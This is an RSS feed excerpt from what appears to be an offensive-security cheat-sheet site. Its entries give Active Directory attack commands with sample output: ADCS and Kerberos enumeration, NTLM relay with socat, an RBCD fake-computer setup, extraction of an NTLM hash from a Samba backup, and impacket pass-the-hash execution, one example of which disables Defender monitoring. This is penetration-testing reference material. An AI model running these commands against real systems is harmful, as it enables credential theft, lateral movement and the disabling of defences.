channel.title: Pass-the-Hash on TLDRBins
channel.description: Recent content in Pass-the-Hash on TLDRBins

item.title: ADCS
item.description: Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable # NTLM certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable # Kerberos certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP> # Password nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs # NTLM nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .

item.title: Cross Session Relay
item.description: Display Information about the Session Host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE >services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM Hash RemotePotato0 KrbRelay 1. Redirect Auth Request Back to Target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:<RELAY_PORT> $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger Auth Request .

item.title: Kerberos
item.description: Users Enum kerbrute metasploit kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE> $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 > Using KDC(s): 2024/09/24 14:54:41 > dc.

item.title: NTLM Relay Attack
item.description: Abuse #1: Add Shadow Credential 1. Run socat to Redirect Traffic (Inside Pivoting Node) # Upload socat.zip and unzip Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat 2. Enable Webdav (Inside Windows Target) [Optional] $Source = @" using System; using System.

item.title: RBCD Attack
item.description: RBCD Attack Linux Windows 1. Create a Fake Computer [Optional] # Check machine account quota nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M maq $ nxc ldap example.com -u 'test.user' -p 'Test1234' -M maq SMB 10.10.11.10 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False) LDAP 10.10.11.10 389 DC [+] example.com\test.user:Test1234 MAQ 10.10.11.10 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.11.10 389 DC MachineAccountQuota: 10 # Add a fake computer impacket-addcomputer -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>' $ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'Test1234' -dc-ip 10.

item.title: Samba
item.description: Priesc #1: Retrieve NTLM from Samba Backup ldbsearch 1. Query 'unicodepwd' of Target User ldbsearch -H sam.ldb '(samaccountname=<USER>)' 'unicodepwd' $ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd' # record 1 dn: CN=Administrator,CN=Users,DC=example,DC=com unicodePwd:: iEb36u6PsRetBr3YMLdYbA== # Referral ref: ldap:///CN=Configuration,DC=example,DC=com # Referral ref: ldap:///DC=DomainDnsZones,DC=example,DC=com # Referral ref: ldap:///DC=ForestDnsZones,DC=example,DC=com # returned 4 records # 1 entries # 3 referrals 2. Convert to Hex echo -n '<UNICODEPWD>' | base64 -d | xxd -p $ echo -n 'iEb36u6PsRetBr3YMLdYbA==' | base64 -d | xxd -p 8846f7eaee8fb117ad06bdd830b7586c 3.

item.title: Winrm
item.description: PsExec Password NTLM # Domain auth impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' # Local auth impacket-psexec '<USER>:<PASSWORD>@<TARGET>' # Domain auth impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> # Local auth impacket-psexec '<USER>@<TARGET>' -hashes :<HASH> AtExec Password NTLM # Local auth impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' 'powershell.exe -c "<CMD>"' # Local auth impacket-atexec '<WORKGROUP>/<USER>@<TARGET_DOMAIN>' -hashes :<HASH> 'powershell.exe -c "<CMD>"' $ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"' Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [!] This will work ONLY on Windows >= Vista [*] Creating task \gNBJCrJi [*] Running task \gNBJCrJi [*] Deleting task \gNBJCrJi [*] Attempting to read ADMIN$\Temp\gNBJCrJi.
